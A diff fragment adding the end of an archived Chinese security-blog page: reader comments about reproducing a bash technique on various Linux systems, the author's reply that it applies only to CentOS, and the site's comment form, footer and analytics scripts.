+                    </time>
+                    <a href="javascript:reply_to('3912', '%E6%B0%B4%E6%89%8B')">回复</a>
+                  </p>
+                  <p class="comment-meta">测试了 3 个系统，都没成功：<br>Debian 11(bash 5.1.16)、<br>Alpine 15.4（bash 5.1.16）、<br>CentOS 7 （bash 4.2.46)</p>
+                </div>
+              </div>
+              
+                
+                  <div class="child-node">
+              <div class="flex mb-2" id="comment-3913">
+                <div class="gravatar">
+                  <img src="https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
+                </div>
+                <div class="ps-2">
+                  <p class="comment-meta title">
+                    <a href="https://www.leavesongs.com" target="_blank" rel="nofollow noopener">phithon</a>
+                    <time datetime="2022年7月18日 21:10" itemprop="datePublished">
+                      2022 七月 18 21:10
+                    </time>
+                    <a href="javascript:reply_to('3913', 'phithon')">回复</a>
+                  </p>
+                  <p class="comment-meta">@水手 本文讲的内容只在centos下有效，所以你其实没看懂文章的意思，否则也不会测试debian和alpine。可以再阅读几遍，看看操作是否有误，为何无法在centos7下复现。</p>
+                </div>
+              </div>
+              
+            </div>
+                
+              
+            
+              <div class="flex mb-2" id="comment-3864">
+                <div class="gravatar">
+                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
+                </div>
+                <div class="ps-2">
+                  <p class="comment-meta title">
+                    <a href="" target="_blank" rel="nofollow noopener">aa</a>
+                    <time datetime="2022年4月29日 22:20" itemprop="datePublished">
+                      2022 四月 29 22:20
+                    </time>
+                    <a href="javascript:reply_to('3864', 'aa')">回复</a>
+                  </p>
+                  <p class="comment-meta">p师傅太厉害了,看完只有一句卧槽</p>
+                </div>
+              </div>
+              
+            
+              <div class="flex mb-2" id="comment-3848">
+                <div class="gravatar">
+                  <img src="../static/placeholder.jpg" width="40px" height="40px" alt="">
+                </div>
+                <div class="ps-2">
+                  <p class="comment-meta title">
+                    <a href="" target="_blank" rel="nofollow noopener">a</a>
+                    <time datetime="2022年4月7日 17:43" itemprop="datePublished">
+                      2022 四月 07 17:43
+                    </time>
+                    <a href="javascript:reply_to('3848', 'a')">回复</a>
+                  </p>
+                  <p class="comment-meta">真是望尘莫及 ，真厉害！</p>
+                </div>
+              </div>
+              
+            
+          
+        </div>
+
+        
+
+        <form method="post" enctype="multipart/form-data" action="#reply" id="reply" class="mb-4">
+          <div class="container-fluid px-0">
+            
+            <div class="row">
+              <div class="col">
+                <textarea name="content" cols="40" rows="6" required id="id_content">
+</textarea>
+              </div>
+            </div>
+            <div class="row gx-2">
+              <div class="col-4">
+                <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
+              </div>
+              <div class="col-4">
+                <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
+              </div>
+              <div class="col-4">
+                <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
+              </div>
+            </div>
+          </div>
+          <div class="row">
+            <div class="col-4">
+              <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="f75e02e49106343e59b62ea53131cad38590a5cf" />
+</div><div class="col-6">
+<img src="../captcha/image/f75e02e49106343e59b62ea53131cad38590a5cf/index.png" alt="captcha" class="captcha" /></div></div>
+            </div>
+          </div>
+          <div class="row">
+            <div class="col">
+              <input type="submit" class="ui-button ui-button-sgreen" value="提交">
+            </div>
+          </div>
+          <input type="hidden" name="archive" value="477" id="id_archive">
+          <input type="hidden" name="parent" id="id_parent">
+          <input type="hidden" name="csrfmiddlewaretoken" value="9a5xPr31DEltU42vsyynl76lA4Alze3UVItonwEK10zcsCQTuzv8iA9qVrRw8Qfc">
+        </form>
+      </div>
+    </div>
+    <div class="row justify-content-center">
+      <div class="col-lg-7 col-md-10 col-sm-12">
+        <footer class="footer mx-auto">
+  <div class="footer-left">
+    Copyright &copy; 2023 Powered by talkbook
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="../index.html">首页</a></li>
+        <li><a href="../feed/index.rss" target="_blank">RSS订阅</a></li>
+        <li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+        <li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+        <li><a href="../index.html">更换模板</a></li>
+      </ul>
+    </nav>
+  </div>
+</footer>
+      </div>
+    </div>
+  </div>
+
+<script src="https://cdn.staticfile.org/jquery/2.2.4/jquery.min.js"></script>
+<script src="../static/cactus/js/main%EF%B9%96v=2021102502.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-FF5KPQ1CZ6');
+</script>
+
+  <script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
+  <script>
+      $(document).ready(function () {
+          $(".content a").each(function (i, e) {
+              if (e.host != 'www.leavesongs.com') {
+                  e.target = '_blank';
+              }
+          });
+          $(".content img").each(function (i, e) {
+              if (e.parentNode.tagName.toUpperCase() != 'A') {
+                  $(e).wrap('<a href="' + escapeHtml(e.src) + '" class="fancybox"></a>');
+              } else {
+                  $(e.parentNode).addClass('fancybox');
+              }
+          });
+          $('.fancybox').fancybox();
+      })
+  </script>
+
+</body>
+</html>
